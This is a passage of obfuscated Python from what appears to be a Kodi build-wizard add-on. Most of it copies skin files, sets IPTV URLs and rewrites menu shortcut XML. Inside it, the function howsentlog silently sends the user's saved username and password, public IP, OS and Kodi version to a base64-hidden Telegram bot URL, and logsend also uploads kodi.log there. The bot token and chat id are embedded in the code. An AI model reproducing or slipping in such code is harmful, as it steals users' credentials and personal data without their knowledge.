            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:817
    with open (OO0O0OOOO000O0000 ,'w')as O000000O0O0O000O0 :#line:820
      O000000O0O0O000O0 .write (O0O00OOOOO0O00OOO )#line:821
    try :#line:822
      OOO0O0O0OO0OO00O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")#line:823
      OOO0O0O00O0O0O00O =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:824
      copyfile (OOO0O0O0OO0OO00O0 ,OOO0O0O00O0O0O00O )#line:826
    except :pass #line:827
def testcommand ():#line:828
	OO0O0OOO0O000O0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","plugin.program.Anonymous","skin","guisettings.xml")#line:829
	OO0O0O00O0OOO00OO =os .path .join (xbmc .translatePath ("special://home/"),"userdata","guisettings.xml")#line:830
	copyfile (OO0O0OOO0O000O0O0 ,OO0O0O00O0OOO00OO )#line:832
def autotrakt ():#line:837
    O0OOO00O0000OOOO0 =(ADDON .getSetting ("auto_trk"))#line:838
    if O0OOO00O0000OOOO0 =='true':#line:839
       from resources .libs import trk_aut #line:840
def traktsync ():#line:842
     OO00O0OOOO0OOO0O0 =(ADDON .getSetting ("auto_trk"))#line:843
     if OO00O0OOOO0OOO0O0 =='true':#line:844
       from resources .libs import trk_aut #line:847
     else :#line:848
        ADDON .openSettings ()#line:849
def imdb_synck ():#line:851
   try :#line:852
     O0O0O00000O0O0O00 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:853
     O0O00OOOO0O0000O0 =xbmcaddon .Addon ('plugin.video.gaia')#line:854
     O0000OO0000O000O0 =(ADDON .getSetting ("imdb_sync"))#line:855
     OO0O000O0O00OO000 ="imdb.user"#line:856
     OOOOOO0OOOO000000 ="accounts.informants.imdb.user"#line:857
     O0O0O00000O0O0O00 .setSetting (OO0O000O0O00OO000 ,str (O0000OO0000O000O0 ))#line:858
     O0O00OOOO0O0000O0 .setSetting ('accounts.informants.imdb.enabled','true')#line:859
     O0O00OOOO0O0000O0 .setSetting (OOOOOO0OOOO000000 ,str (O0000OO0000O000O0 ))#line:860
   except :pass #line:861
def dis_or_enable_addon (OO0O00OOO000OOOOO ,O0OO00O0OO0O0O00O ,enable ="true"):#line:863
    import json #line:864
    O00OOOOOO00OOOOOO ='"%s"'%OO0O00OOO000OOOOO #line:865
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00OOO000OOOOO )and enable =="true":#line:866
        logging .warning ('already Enabled')#line:867
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O00OOO000OOOOO )#line:868
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O00OOO000OOOOO )and enable =="false":#line:869
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O00OOO000OOOOO )#line:870
    else :#line:871
        OO0O00OOOO0O00000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OOOOOO00OOOOOO ,enable )#line:872
        O00OOOO000OO0OOOO =xbmc .executeJSONRPC (OO0O00OOOO0O00000 )#line:873
        O00OOO00O0OO000O0 =json .loads (O00OOOO000OO0OOOO )#line:874
        if enable =="true":#line:875
            xbmc .log ("### Enabled %s, response = %s"%(OO0O00OOO000OOOOO ,O00OOO00O0OO000O0 ))#line:876
        else :#line:877
            xbmc .log ("### Disabled %s, response = %s"%(OO0O00OOO000OOOOO ,O00OOO00O0OO000O0 ))#line:878
    if O0OO00O0OO0O0O00O =='auto':#line:879
     return True #line:880
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:881
def iptvset ():#line:884
  try :#line:885
    OOOOOO0OO0OO00OO0 =(ADDON .getSetting ("iptv_on"))#line:886
    if OOOOOO0OO0OO00OO0 =='true':#line:888
       if KODIV >=17 and KODIV <18 :#line:890
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:891
         O0OOOO00OOOO00OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:892
         OO000O0O00O000OO0 =(ADDON .getSetting ("iptvUrl"))#line:894
         O0OOOO00OOOO00OOO .setSetting ('m3uUrl',OO000O0O00O000OO0 )#line:895
         O0OO0O0OOO0O000O0 =(ADDON .getSetting ("epg_Url"))#line:896
         O0OOOO00OOOO00OOO .setSetting ('epgUrl',O0OO0O0OOO0O000O0 )#line:897
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:900
         iptvsimpldownpc ()#line:901
         wiz .kodi17Fix ()#line:902
         xbmc .sleep (1000 )#line:903
         O0OOOO00OOOO00OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:904
         OO000O0O00O000OO0 =(ADDON .getSetting ("iptvUrl"))#line:905
         O0OOOO00OOOO00OOO .setSetting ('m3uUrl',OO000O0O00O000OO0 )#line:906
         O0OO0O0OOO0O000O0 =(ADDON .getSetting ("epg_Url"))#line:907
         O0OOOO00OOOO00OOO .setSetting ('epgUrl',O0OO0O0OOO0O000O0 )#line:908
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:910
         iptvsimpldown ()#line:911
         wiz .kodi17Fix ()#line:912
         xbmc .sleep (1000 )#line:913
         O0OOOO00OOOO00OOO =xbmcaddon .Addon ('pvr.iptvsimple')#line:914
         OO000O0O00O000OO0 =(ADDON .getSetting ("iptvUrl"))#line:915
         O0OOOO00OOOO00OOO .setSetting ('m3uUrl',OO000O0O00O000OO0 )#line:916
         O0OO0O0OOO0O000O0 =(ADDON .getSetting ("epg_Url"))#line:917
         O0OOOO00OOOO00OOO .setSetting ('epgUrl',O0OO0O0OOO0O000O0 )#line:918
  except :pass #line:919
def howsentlog ():#line:926
       try :#line:928
          import json #line:929
          OOO0O00OOO00OO000 =(ADDON .getSetting ("user"))#line:930
          OOO0000O0000O0O0O =(ADDON .getSetting ("pass"))#line:931
          O000O0000OOOOOO0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:932
          OO0000000OO0000O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:934
          O000OO0OO0O000O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:935
          O000O0000O00O0OOO =str (json .loads (O000OO0OO0O000O00 )['ip'])#line:936
          OO00OO00O0O0O0000 =OOO0O00OOO00OO000 #line:937
          OO0O0OO0OO00O000O =OOO0000O0000O0O0O #line:938
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:939
          xbmc .sleep (1500 )#line:940
          OO0O0OO00O00O0OO0 =xbmc .getInfoLabel ('System.OSVersionInfo')#line:941
          import socket #line:943
          O000OO0OO0O000O00 =urllib2 .urlopen (OO0000000OO0000O0 .decode ('base64')+' מערכת הפעלה: '+OO0O0OO00O00O0OO0 +' שם משתמש: '+OO00OO00O0O0O0000 +' סיסמה: '+OO0O0OO0OO00O000O +' קודי: '+O000O0000OOOOOO0O +' כתובת: '+O000O0000O00O0OOO ).readlines ()#line:944
       except :pass #line:946
def googleindicat ():#line:949
			import logg #line:950
			OO0O0O00O00000OOO =(ADDON .getSetting ("pass"))#line:951
			O0O0OOOOO00OOO0O0 =(ADDON .getSetting ("user"))#line:952
			logg .logGA (OO0O0O00O00000OOO ,O0O0OOOOO00OOO0O0 )#line:953
def logsend ():#line:954
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:955
      O00O00OO0OOO00OO0 =xbmcgui .DialogBusy ()#line:956
      O00O00OO0OOO00OO0 .create ()#line:957
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:958
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:959
      howsentlog ()#line:961
      import requests #line:962
      if xbmc .getCondVisibility ('system.platform.windows'):#line:963
         O0O0OO0O00O0O0000 =xbmc .translatePath ('special://home/kodi.log')#line:964
         O0O000OO0O0OOOOOO ={'chat_id':(None ,'-274262389'),'document':(O0O0OO0O00O0O0000 ,open (O0O0OO0O00O0O0000 ,'rb')),}#line:968
         OO000OO0O0O000O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:969
         O00000O0OO000OO00 =requests .post (OO000OO0O0O000O0O .decode ('base64'),files =O0O000OO0O0OOOOOO )#line:971
      elif xbmc .getCondVisibility ('system.platform.android'):#line:972
           O0O0OO0O00O0O0000 =xbmc .translatePath ('special://temp/kodi.log')#line:973
           O0O000OO0O0OOOOOO ={'chat_id':(None ,'-274262389'),'document':(O0O0OO0O00O0O0000 ,open (O0O0OO0O00O0O0000 ,'rb')),}#line:977
           OO000OO0O0O000O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:978
           O00000O0OO000OO00 =requests .post (OO000OO0O0O000O0O .decode ('base64'),files =O0O000OO0O0OOOOOO )#line:980
      else :#line:981
           O0O0OO0O00O0O0000 =xbmc .translatePath ('special://kodi.log')#line:982
           O0O000OO0O0OOOOOO ={'chat_id':(None ,'-274262389'),'document':(O0O0OO0O00O0O0000 ,open (O0O0OO0O00O0O0000 ,'rb')),}#line:986
           OO000OO0O0O000O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:987
           O00000O0OO000OO00 =requests .post (OO000OO0O0O000O0O .decode ('base64'),files =O0O000OO0O0OOOOOO )#line:989
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:990
def rdoff ():#line:992
	O0O00000O0O00OOO0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1023
	O00O0OO00OO000O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1024
	copyfile (O0O00000O0O00OOO0 ,O00O0OO00OO000O00 )#line:1025
def skindialogsettind18 ():#line:1026
	try :#line:1027
		O000OO000O00O00OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1028
		O00000000OOO0000O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1029
		copyfile (O000OO000O00O00OO ,O00000000OOO0000O )#line:1030
	except :pass #line:1031
def rdon ():#line:1032
	loginit .loginIt ('restore','all')#line:1033
	OO0OO0OOOO000000O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1035
	OO0000O000OO0OO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1036
	copyfile (OO0OO0OOOO000000O ,OO0000O000OO0OO00 )#line:1037
def adults18 ():#line:1039
  O0O0OOO0O000000O0 =(ADDON .getSetting ("adults"))#line:1040
  if O0O0OOO0O000000O0 =='true':#line:1041
    O00OOO00O0000OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1042
    with open (O00OOO00O0000OO00 ,'r')as OO0O00OO0OOO00O00 :#line:1043
      OOO0000000OOOOO0O =OO0O00OO0OOO00O00 .read ()#line:1044
    OOO0000000OOOOO0O =OOO0000000OOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1062
    with open (O00OOO00O0000OO00 ,'w')as OO0O00OO0OOO00O00 :#line:1065
      OO0O00OO0OOO00O00 .write (OOO0000000OOOOO0O )#line:1066
def rdbuildaddon ():#line:1067
  O000OOO0O0OOOO0O0 =(ADDON .getSetting ("auto_rd"))#line:1068
  if O000OOO0O0OOOO0O0 =='true':#line:1069
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1070
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1071
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1072
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1090
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1093
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1094
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1098
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1099
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1100
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1118
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1121
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1122
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1126
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1127
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1128
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1146
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1149
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1150
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1154
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1155
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1156
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1174
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1177
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1178
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1181
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1182
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1183
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1201
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1204
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1205
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1207
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1208
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1209
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1227
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1230
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1231
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1233
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1234
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1235
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1253
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1256
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1257
    O0OOO00OO0OO0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1260
    with open (O0OOO00OO0OO0OO0O ,'r')as O0OO0O0O000OOOOO0 :#line:1261
      O000O00OOO00O0000 =O0OO0O0O000OOOOO0 .read ()#line:1262
    O000O00OOO00O0000 =O000O00OOO00O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1280
    with open (O0OOO00OO0OO0OO0O ,'w')as O0OO0O0O000OOOOO0 :#line:1283
      O0OO0O0O000OOOOO0 .write (O000O00OOO00O0000 )#line:1284
def rdbuildinstall ():#line:1287
  try :#line:1288
   OO000OOO0O0O00000 =(ADDON .getSetting ("auto_rd"))#line:1289
   if OO000OOO0O0O00000 =='true':#line:1290
     OOO000O000O0OO000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1291
     O00OO0O00O0OOOO00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1292
     copyfile (OOO000O000O0OO000 ,O00OO0O00O0OOOO00 )#line:1293
  except :#line:1294
     pass #line:1295
def rdbuildaddonoff ():#line:1298
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1301
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1302
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1303
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1321
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1324
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1325
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1329
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1330
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1331
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1349
    with open (OO0OOOO0O0O0000O0 ,'w')as O0000O00OOO00OOOO :#line:1352
      O0000O00OOO00OOOO .write (O0O0OO0OO00O0OOOO )#line:1353
    OO0OOOO0O0O0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1357
    with open (OO0OOOO0O0O0000O0 ,'r')as O0000O00OOO00OOOO :#line:1358
      O0O0OO0OO00O0OOOO =O0000O00OOO00OOOO .read ()#line:1359
    O0O0OO0OO00O0OOOO =O0O0OO0OO00O0OOOO .replace ('''	<shortcut>
		<defaultID />
